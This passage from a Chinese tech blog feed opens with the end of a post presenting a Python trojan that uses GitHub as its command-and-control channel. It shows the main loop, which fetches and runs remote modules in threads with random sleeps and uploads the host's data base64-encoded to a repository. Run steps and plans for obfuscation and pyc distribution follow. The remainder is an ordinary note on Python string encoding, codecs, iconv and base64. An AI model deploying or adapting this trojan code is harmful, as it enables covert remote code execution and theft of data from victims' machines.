    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# store the result in our repo&lt;/span&gt;
    &lt;span class="n"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;


&lt;span class="c1"&gt;# main trojan loop&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;meta_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

        &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],))&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;相关模块说明&lt;/h3&gt;
&lt;h5&gt;&lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Python library for interfacing with the GitHub APIv3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;&lt;a href="https://docs.python.org/2/library/imp.html"&gt;imp&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Access the import internals&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;运行&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#fork https://github.com/wwj718/blackhatpythonbook&lt;/span&gt;
git clone https://github.com/USERNAME/blackhatpythonbook
&lt;span class="nb"&gt;cd&lt;/span&gt; blackhatpythonbook
mv local.yaml.template local.yaml
&lt;span class="c1"&gt;#填入你的github的用户名和密码&lt;/span&gt;
pip install github3.py
python git_trojan.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后你的本机数据将每隔一段时间上传到data/abc目录中，值得注意的是，数据经过base64编码&lt;/p&gt;
&lt;p&gt;你也可以在modules目录下新建功能脚本，脚本将被定期拉到client执行，这样一来你可以以插件的形式来添加task&lt;/p&gt;
&lt;h1&gt;想象空间&lt;/h1&gt;
&lt;p&gt;我们发现一个有趣的现象，那些叫做软件的代码，通常拥有充足的资源和权限，用户尽力满足配合软件的种种需求，饶是如此，它们还常常莫名其妙地奔溃，而另一类被称作病毒的代码，时刻被限制和提防，饶是如此，它们依然能在各种复杂的环境下健壮地运行。&lt;/p&gt;
&lt;p&gt;在某种意义上，计算机科学由黑客（hacker）驱动着&lt;/p&gt;
&lt;p&gt;我们实际上可以将以上代码看做一种热更新机制，我们可以用它来升级已分发的程序，不需要重启就能升级软件，看上去如同生物一般生长&lt;/p&gt;
&lt;h1&gt;github Webhooks &amp;amp; services&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Webhooks allow external services to be notified when certain events happen within your repository. When the specified events happen, we’ll send a POST request to each of the URLs you provide&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用github提供的webhook功能，我们可以进行时间通知&lt;/p&gt;
&lt;h3&gt;热加载&lt;/h3&gt;
&lt;p&gt;热加载是我前段时间感兴趣的一个话题，最初源于和@xudong的讨论，有空再写这部分 &lt;/p&gt;
&lt;h1&gt;建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用小号测试&lt;/li&gt;
&lt;li&gt;不要做坏事哦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;接下来干啥&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;代码混淆&lt;/li&gt;
&lt;li&gt;分发pyc&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;pyinstaller&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;pyinstaller --onefile git_trojan.py 能能通过&lt;/li&gt;
&lt;li&gt;pyinstaller 编译python2脚本时Queue会找不到， 使用2to3转为python3编译，会进进下一个问题&lt;/li&gt;
&lt;li&gt;github3.py引用的requests会报错，编码问题（python2和3都存在）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;编码问题&lt;/h3&gt;
&lt;p&gt;2to3 -w git_trojan.py,之后用python3执行，报错：&lt;code&gt;LookupError: unknown encoding: idna&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;blackhatpythonbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Jul 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-07-13:use-python-and-github-create-Trojan-Horse.html</guid><category>dev-tools</category></item><item><title>编码相关的笔记</title><link>/decode-and-encode-note.html</link><description>&lt;p&gt;编码/解码问题是个大坑，其中的复杂性，大多来自历史包袱&lt;/p&gt;
&lt;p&gt;由于计算机领域的分层架构和多平台问题，这个问题被进一步加剧，unicode的出现，给这个问题带来了曙光.&lt;/p&gt;
&lt;p&gt;可是生活不总是那么美好的，有些时候，一不小心，我们还是会掉到满是泥沼的坑里&lt;/p&gt;
&lt;p&gt;周末在凤凰书城看一本数据清洗相关的书，其中说道噪声数据的问题，有问题的编码是噪声的来源之一，书中分享了不少好用的方法，在便签里记了一些，加上之前笔记里的，正好整理成一篇文章&lt;/p&gt;
&lt;h1&gt;编码问题&lt;/h1&gt;
&lt;p&gt;这里引《中文编码杂谈》中关于乱码的讨论&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Linux平台上如果使用cat等命令查看文件中的中文内容时，可能出现乱码。这也是编码的问题。简单的说是文件时按照A编码保存，但是cat命令按照当前Locale设定的B编码去查看，在B和A不兼容的时候就出现了乱码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;核心概念&lt;/h1&gt;
&lt;p&gt;引&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;字符集&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;简单的说字符集就规定了某个文字对应的二进制数字存放方式（编码）和某串二进制数值代表了哪个文字（解码）的&lt;code&gt;转换关系&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;字符编码&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数  --wikipedia&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Unicode和UTF-8&lt;/h1&gt;
&lt;p&gt;Unicode对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。&lt;/p&gt;
&lt;p&gt;Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储&lt;/p&gt;
&lt;p&gt;而UTF-8就是字符编码，是Unicode规则字库的一种实现形式&lt;/p&gt;
&lt;h1&gt;Python中的编码问题&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;一文中描述了python中可能出现的一些编解码难题&lt;/p&gt;
&lt;p&gt;原因之一是Python 2.x默认将所有的字符串当做ASCII来对待（python3中会好很多）&lt;/p&gt;
&lt;p&gt;当你使用string类型时，实际上会储存一个字节串&lt;/p&gt;
&lt;h3&gt;解码字节流&lt;/h3&gt;
&lt;p&gt;你可以把字节流&lt;code&gt;解码&lt;/code&gt;(decode)成一个Unicode对象，把一个Unicode 对象编码(encode)为字节流&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你最好是尽早的将字节流解码为Unicode(字节流进入程序的时候)&lt;/li&gt;
&lt;li&gt;你不能简单地输出一个Unicode对象。它必须在输出前被变成一个字节串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;str/unicode&lt;/h3&gt;
&lt;p&gt;在mac下python2.7.5&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# unicode&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\u4f60\u597d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; 
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;

&lt;span class="c1"&gt;# unicode_c = unicode(&amp;quot;你好&amp;quot;) python2会报错，python会把所有东西作为字节流理解&lt;/span&gt;
&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#  True，如果&lt;/span&gt;

&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;################&lt;/span&gt;
&lt;span class="c1"&gt;# str&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="o"&gt;==&lt;/span&gt;  &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;__repr__的目标是准确性，__str__的目标是可读性&lt;/p&gt;
&lt;h3&gt;codecs模块&lt;/h3&gt;
&lt;p&gt;codecs模块能在处理字节流的时候提供很大帮助。你可以用定义的编码来打开文件并且你从文件里读取的内容会被自动转化为Unicode对象。&lt;/p&gt;
&lt;p&gt;读写文件&lt;/p&gt;
&lt;p&gt;当从一个文件读取数据的时候，codecs.open 会创建一个文件对象能够自动将utf-8编码文件转化为一个Unicode对象,而写入文件这样写：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/utf-8.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\u2013&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用urllib流&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Reader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getreader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; ,应该尽可能让程序内部的数据都是 &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你必须对codecs模块十分小心。你传进去的东西必须是一个Unicode对象,否则它会自动将字节流作为ASCII进行解码。&lt;/p&gt;
&lt;h3&gt;策略&lt;/h3&gt;
&lt;p&gt;python编解码涉及的问题可能很多，上至大神下至小白，都可能受扰，为了保持简单，我们可以保持这样一种习惯:关注输入输出，内部保持unicode。&lt;/p&gt;
&lt;p&gt;每当有数据进入程序，将其解码（decode）为unicode(utf-8）&lt;/p&gt;
&lt;p&gt;当有数据从程序中输出时，将其编码（encode）为utf-8&lt;/p&gt;
&lt;p&gt;最佳实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最先解码(解码为unicode对象)，最后编码（输出为字节码）&lt;ul&gt;
&lt;li&gt;最先解码意味着无论何时有字节流输入，需要尽早将输入解码为Unicode&lt;/li&gt;
&lt;li&gt;最后编码意味着只有你打算将文本输出到某个地方时，才把它编码为字节流。这个输出可能是一个文件，一个数据库，一个socket等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认使用utf-8编码&lt;/li&gt;
&lt;li&gt;使用codecs和Unicode对象来简化处理&lt;ul&gt;
&lt;li&gt;codecs模块能够让我们在处理诸如文件或socket这样的流的时候能少踩一些坑。如果没有codecs提供的这个工具，你就必须将文件内容读取为字节流，然后将这个字节流解码为Unicode对象。&lt;/li&gt;
&lt;li&gt;codecs模块能够让你快速的将&lt;code&gt;字节流&lt;/code&gt;转化为&lt;code&gt;Unicode对象&lt;/code&gt;，省去很多麻烦。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;linux下的一些工具&lt;/h1&gt;
&lt;h3&gt;file&lt;/h3&gt;
&lt;p&gt;file命令用来探测给定文件的类型,&lt;/p&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-i：显示MIME类别。&lt;/li&gt;
&lt;li&gt;-c：详细显示指令执行过程，便于排错或分析程序执行的情形；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file *&lt;/p&gt;
&lt;h3&gt;iconv&lt;/h3&gt;
&lt;p&gt;conv命令是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码&lt;/p&gt;
&lt;p&gt;iconv -f encoding -t encoding inputfile&lt;/p&gt;
&lt;p&gt;iconv -f UTF-8 -t GBK file1 -o file2  //将一个UTF-8 编码的文件转换成GBK编码&lt;/p&gt;
&lt;h3&gt;chardet&lt;/h3&gt;
&lt;p&gt;有时候我们不知道文件/字节流采用了什么编码，可以让chardet来猜测编码，chardet是python的一个库&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;传输编码语法（transfer encoding syntax）&lt;/h3&gt;
&lt;p&gt;用于处理上一层次的字符编码方案提供的字节序列。一般其功能包括两种：一是把字节序列的值映射到一套更受限制的值域内，以满足传输环境的限制，例如Email传输时Base64或者quoted-printable，都是把8位的字节编码为7位长的数据；另一是压缩字节序列的值，如LZW或者进程长度编码等无损压缩技术。&lt;/p&gt;
&lt;h6&gt;Base64编码&lt;/h6&gt;
&lt;p&gt;base64编码相关的部分，可以翻阅我的&lt;a href="http://blog.just4fun.site/jwt-note.html"&gt;JWT学习笔记&lt;/a&gt;中的附录部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Base64常用于在通常处理文本数据的场合，表示、传输、存储一些&lt;code&gt;二进制数据&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;常用于在URL、Cookie、网页中传输少量二进制数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓Base64，就是说选出64个字符----小写字母a-z、大写字母A-Z、数字0-9、符号"+"、"/"（再加上作为垫字的"="，实际上是65个字符）----作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于base64更多的细节可以参考维基百科和&lt;a href="http://www.ruanyifeng.com/blog/2008/06/base64.html"&gt;Base64笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在python中实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#aGVsbG8=  ， 被编码的不是应该是二进制数据吧，python的二进制默认被解析为ascii？，在这里hello无论是b&amp;#39;hello&amp;#39;还是&amp;#39;hello&amp;#39;/u&amp;#39;hello&amp;#39;，结果都一样&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aGVsbG8=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# hello&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# \u4f60\u597d&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;#5L2g5aW9&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe4\xbd\xa0\xe5\xa5\xbd&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种&amp;quot;url safe&amp;quot;的base64编码，其实就是把字符+和/分别变成-和_&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;哈里谢顿&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG/ , 有反斜杠&lt;/span&gt;
&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG_&lt;/span&gt;
